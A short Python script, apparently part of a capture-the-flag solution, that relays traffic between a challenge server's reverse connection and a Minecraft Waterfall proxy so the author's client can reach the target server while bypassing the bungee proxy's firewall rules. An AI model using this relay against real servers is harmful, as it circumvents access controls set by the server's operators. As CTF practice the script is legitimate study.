"""
This script first accepts an incoming connection from 
ALLES!. Next, it starts listening on :25567 and creates a
comms channel.

When my mc client connects to the proxy, it will actually 
connect directly to the ALLES server, bypassing bungee and its firewall rules.
"""

import socket

MC_PORT = 25567
CTF_PORT = 1337
# Should be quite large to allow initial chunck load
SIZE = 4096

# Open a port for the chal server to connect to
s_ctf = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s_ctf.bind(("", CTF_PORT))
s_ctf.listen()

# Open a port for our Waterfall server to connect to
s_mc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s_mc.bind(("", MC_PORT))
s_mc.listen()

# Wait for the chal server to connect
ctf_conn, ctf_addr = s_ctf.accept()
print("Incomming connection from chal {}".format(ctf_addr))
ctf_conn.settimeout(0.5)

# Wait for Waterfall to connect
mc_conn, mc_addr = s_mc.accept()
mc_conn.settimeout(0.5)
print("\"Evil\" Waterfall proxy connected from {}".format(mc_addr))


while True:
    # [Waterfall] --> [Lua Proxy]
    try:
        client_data = mc_conn.recv(SIZE)
        ctf_conn.send(client_data)
#        print(">send")
    except socket.timeout:
        pass
    # [Waterfall] <-- [Lua Proxy]
    try:
        ctf_data = ctf_conn.recv(SIZE)
        mc_conn.send(ctf_data)
 #       print("<recv")
    except socket.timeout:
        pass

